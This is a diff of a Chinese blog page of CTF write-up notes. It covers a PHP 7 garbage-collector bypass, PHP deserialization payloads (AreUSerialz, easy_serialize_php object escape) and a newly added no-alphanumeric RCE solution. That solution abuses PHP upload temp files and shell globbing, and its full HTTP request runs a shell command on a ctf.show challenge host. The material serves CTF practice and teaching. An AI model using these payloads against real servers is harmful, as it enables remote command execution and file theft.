@@ -459,7 +459,8 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="php7-gc-bypass漏洞利用PHP-garbage-collector程序中的堆溢出触发进而执行命令"><a href="#php7-gc-bypass漏洞利用PHP-garbage-collector程序中的堆溢出触发进而执行命令" class="headerlink" title="php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令"></a>php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令</h3><p>影响范围为linux，php7.0-7.3</p>
+                <p><strong>php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令</strong></p>
+<p>影响范围为linux，php7.0-7.3</p>
 <p>脚本代码</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
@@ -677,14 +678,17 @@
     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
 </code></pre>
-<h4 id="题目练习-GKCTF2020-CheckIN"><a href="#题目练习-GKCTF2020-CheckIN" class="headerlink" title="题目练习[GKCTF2020]CheckIN"></a>题目练习[GKCTF2020]CheckIN</h4><p>就贴关键点</p>
+<p><strong>题目练习[GKCTF2020]CheckIN</strong></p>
+<p>就贴关键点</p>
 <p><img src="/images/60.png"></p>
 <p>发现flag没有权限读取，所以应该是通过执行readflag来获取，但打开readflag是乱码。</p>
 <p><img src="/images/61.png"></p>
 <p>发现tmp，lock目录权限比较大，上传exp到该目录下，然后进行包含该exp文件来执行readflag就行。</p>
 <p><img src="/images/62.png"></p>
 <pre><code>include(&#39;/var/lock/fox.php&#39;);</code></pre>
-<h3 id="php-gt-7-1对类的属性不敏感"><a href="#php-gt-7-1对类的属性不敏感" class="headerlink" title="php&gt;7.1对类的属性不敏感"></a>php&gt;7.1对类的属性不敏感</h3><h4 id="网鼎杯2020-青龙组-–AreUSerialz"><a href="#网鼎杯2020-青龙组-–AreUSerialz" class="headerlink" title="网鼎杯2020[青龙组]–AreUSerialz"></a>网鼎杯2020[青龙组]–AreUSerialz</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+<p><strong>php&gt;7.1对类的属性不敏感</strong></p>
+<p><strong>网鼎杯2020[青龙组]–AreUSerialz</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 <span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
@@ -759,7 +763,8 @@
 <p>②private属性序列化的时候会引入两个\x00，注意这两个\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得很清楚了。同理，protected属性会引入\x00*\x00。此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。</p>
 <p>payload</p>
 <pre><code>O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;S:7:&quot;oavinci&quot;;&#125;</code></pre>
-<h3 id="安洵杯2019-easy-serialize-php-反序列化中的对象逃逸"><a href="#安洵杯2019-easy-serialize-php-反序列化中的对象逃逸" class="headerlink" title="安洵杯2019 easy_serialize_php (反序列化中的对象逃逸)"></a>安洵杯2019 easy_serialize_php (反序列化中的对象逃逸)</h3><p>题目源码</p>
+<p><strong>安洵杯2019 easy_serialize_php (反序列化中的对象逃逸)</strong></p>
+<p>题目源码</p>
 <pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
 
 <span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -812,7 +817,88 @@
 a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc=&quot;;&#125;
 这时s:7 刚好对应 &quot;;s:48:又刚好匹配。
 为啥后面加&#125;应为这样反序列化的时候会刚好认为到这里结束，而忽然&#125;外的内容</code></pre>
-<h3 id="不定时跟新！"><a href="#不定时跟新！" class="headerlink" title="不定时跟新！"></a>不定时跟新！</h3>
+<p><strong>无数字字母无~^RCEctfshow_红包第二弹</strong></p>
+<p><strong>0x01了解PHP上传机制-PHP临时文件</strong></p>
+<p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。<br>上传后会文件会保存在全局变量$_FILES里，该数组包含了所有上传文件的文件信息。</p>
+<ol>
+<li>$_FILES[‘userfile’][‘name’] 客户端文件的原名称。</li>
+<li>$_FILES[‘userfile’][‘type’] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如”image/gif”。</li>
+<li>$_FILES[‘userfile’][‘size’] 已上传文件的大小，单位为字节。</li>
+<li>$_FILES[‘userfile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。</li>
+<li>$_FILES[‘userfile’][‘error’] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。</li>
+<li>$_FILES[‘userfile’][‘tmp_name’] 文件被上传后在服务端存储的临时文件名</li>
+</ol>
+<p>这里的重点就是**$_FILES[‘userfile’][‘tmp_name’]** 这个变量。</p>
+<p><strong>临时文件的存储目录</strong></p>
+<p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由<strong>php.ini</strong>的<strong>upload_tmp_dir</strong>属性指定，假如<strong>upload_tmp_dir</strong>的路径不可写，PHP会上传到系统默认的临时目录中，假如开启了<strong>open_basedir</strong>，要想成功上传，系统默认临时目录需要指定PHP可访问。</p>
+<p>在wamp中，<strong>upload_tmp_dir</strong>属性默认为wamp安装目录下的tmp文件夹：</p>
+<p><img src="/images/89.png"></p>
+<p>在Centos7中，<strong>upload_tmp_dir</strong>没有指定，所以会使用系统默认临时目录，这里是**/tmp<strong>目录，该属性可以通过</strong>sys_get_temp_dir()**函数来获得</p>
+<p><img src="/images/87.png"></p>
+<p><img src="/images/88.png"></p>
+<p><strong>临时文件的命名规则</strong></p>
+<p>在上传存储到临时目录后，<strong>临时文件命名的规则如下</strong>:</p>
+<p>默认为 php+4或者6位随机数字和大小写字母</p>
+<p>php[0-9A-Za-z]{3,4,5,6}</p>
+<p>比如 ：phpXXXXXX.tmp 在windows下有tmp后缀，linux没有。</p>
+<p><strong>0x02通配符与无字母数组命令执行</strong></p>
+<p><img src="/images/90.png"></p>
+<p>既然./exp.txt可以用./??p???代替<br>那么我们上传的临时文件phpxxxxx.tmp也可以用php???.tmp代替</p>
+<p><strong>0x03.+/解释</strong></p>
+<pre><code>linux .(点命令)：读取并且在当前的shell中执行文件中的命令</code></pre>
+<p><img src="/images/91.png"></p>
+<p>点执行了tmp文件里的内容ls，所以这道题中<code>.</code>就是为了执行我们上传的文件中的<code>cat /flag.txt</code>。</p>
+<p><strong>0x04解题</strong></p>
+<p>源码</p>
+<pre><code>&lt;?php
+        if(isset($_GET[&#39;cmd&#39;]))&#123;
+            $cmd=$_GET[&#39;cmd&#39;];
+            highlight_file(__FILE__);
+            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;
+
+                die(&quot;cerror&quot;);
+            &#125;
+            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#39;|\&quot;|\:|\,/&quot;,$cmd))&#123;
+                die(&quot;serror&quot;);
+            &#125;
+            eval($cmd);
+
+        &#125;
+
+     ?&gt;</code></pre>
+<p>通过POST提交修改这几行，可以得到flag</p>
+<pre><code>POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</code></pre>
+<pre><code>Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</code></pre>
+<pre><code>-----------------------------10242300956292313528205888
+Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;
+Content-Type: text/plain
+
+#! /bin/sh
+
+cat /flag.txt
+-----------------------------10242300956292313528205888--</code></pre>
+<p><img src="/images/86.png"></p>
+<p>payload</p>
+<pre><code>POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1
+Host: 7cbb13eb-9640-4d93-90b7-f8368a32a82b.challenge.ctf.show:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: UM_distinctid=178f4146ae66a1-00129bdab95d6-4c3f2779-144000-178f4146ae72a1; __cfduid=de7c42f20101a7efdf5119d4cb19b511f1619002842
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
+Content-Length: 226
+
+-----------------------------10242300956292313528205888
+Content-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;1.jpg&quot;
+Content-Type: text/plain
+
+cat /flag.txt
+-----------------------------10242300956292313528205888--</code></pre>
+
             </div>
             <hr/>
 
